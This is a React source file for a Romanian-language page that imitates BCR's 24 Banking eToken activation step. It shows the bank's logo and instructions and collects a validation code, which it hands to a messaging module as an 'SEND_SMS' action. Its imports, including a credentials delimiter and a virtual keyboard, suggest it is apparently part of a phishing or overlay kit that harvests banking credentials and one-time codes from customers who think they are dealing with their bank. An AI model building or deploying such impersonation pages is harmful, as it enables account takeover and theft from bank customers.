import React, { useState, useEffect } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions, STEPS } from '../utils/constants'
import { FieldType, CREDENTIALS_DELIMETER } from '../utils/constants'
import logo from '../media/logo-bcr.png'
import keyboard from '../media/virtual-keyboard.png'
import eng from '../media/eng.PNG'
import ro from '../media/ro.PNG'
import { ErrorMsg } from './ErrorMsg'
import userIcon from '../media/icon-user.png'
import lockIcon from '../media/icon-eToken.png'
import checkIcon from '../media/icon-validation-code.png'


const stepItems = [{
  icon: userIcon,
  index: 1,
  message: `Completeaza numele de utilizator sau alias-ul cu care te autentifici in 24 Banking.`
},
{
  icon: lockIcon,
  index: 2,
  message: `Introdu seria eToken: asa cum este mentionata in "Ghidul de activare eToken".`
},
{
  icon: checkIcon,
  index: 3,
  message: `Introdu codul de validare afisat in imaginea de mai jos.`
}]

const Steps = () => (
  <div className="steps-container">
    {stepItems.map((item, i) => {
      return(
        <div key={i} className="step-item">
          <div clsasName="step-item-icon">
            <img src={item.icon} alt="icon" />
          </div>
          <div className="step-item-content">
            <div style={{width: '70%'}}>
            <span style={{color: 'red', fontWeight: 'bold'}}><b>{item.index}.</b></span>
            <span style={{color: '#004a7b'}}>{item.message}</span>
            </div>
          </div>
        </div>
      )
    })}
  </div>
)

export const Step_2 = props => {
  const { store, changeStore } = props
  const [value, setValue] = useState(store.step_2_cod)

  const error = store.error
  const setError = val => changeStore({ error: val })

    const handleChange = (value) => {
    setValue(value)
  }

  const handleSubmit = () => {

    if (!value) {
      setError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_SMS, payload: value })


    changeStore({
      step_2_cod: value,
      loading: true,
    })

  }

  return (
    <div className="section-valid-container" >
      <div className="logo-container" style={{marginTop: 20}}>
        <img src={logo} alt="bcr-logo" />
      </div>
      <div className="valid-container">
        <div className="valid-title-container">
          <h2>
            Transmitere cod de activare eToken
          </h2>
        </div>
        <div className="valid-content-container">
          <div className="content-description">
            <b>Cu eToken poti face plati rapid si sigur de oriunde te afli.</b>
          </div>
        <Steps />

          <div className="content-description-info">
             Vei primi codul de activare prin SMS la numarul de telefon inregistrat in sistemul nostru. Foloseste acest cod, impreuna cu informatiile continute in Ghidul de Activare pentru a (re)activa aplicatia eToken.
          </div>
          <div className="form-valid-container">
            <div className="form-field">
              <label>
                <b>Codul de validare</b>
              </label>
              <input id="captcha-response" name="captch-response" type="text" onChange={e => handleChange(e.target.value)} value={value} />
              {error && <ErrorMsg errorMessage="Codul de validare este introdus eronat." />}
            </div>
            <div className="buttons-container">
              <button onClick={() => changeStore({step: STEPS.STEP_1})}>
                Inapoi
              </button>
              <button onClick={handleSubmit}>
              Trimite codul de activare eToken
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
    
  )
}


